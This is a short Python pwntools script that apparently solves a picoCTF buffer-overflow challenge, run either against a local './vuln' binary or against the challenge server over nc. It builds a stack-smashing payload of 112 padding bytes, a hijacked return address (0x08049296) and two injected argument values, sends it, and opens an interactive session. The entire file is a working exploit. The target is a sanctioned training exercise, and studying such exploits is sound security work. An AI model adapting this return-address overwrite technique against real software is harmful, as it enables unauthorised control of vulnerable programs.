#!/usr/bin/env python3

from pwn import *
import argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog="", description="")
	parser.add_argument("-l", "--local", action="store_true")
	parser.add_argument("-r", "--remote", action="store_true")
	args = parser.parse_args()

	if args.local:
		proc = process(["./vuln"])
	elif args.remote:
		proc = process(["nc", "saturn.picoctf.net", "59262"])
	else:
		print("[!] Use either --local or --remote")
		exit()

	context.log_level = "debug"

	payload = b"A" * 112
	payload += p32(0x08049296)
	payload += b"B" * 4
	payload += p32(0xCAFEF00D)
	payload += p32(0xF00DF00D)

	proc.recvuntil(b"Please enter your string: ", payload)
	log.info("[+] Sending payload")
	proc.sendline(payload)

	proc.interactive()
	proc.close()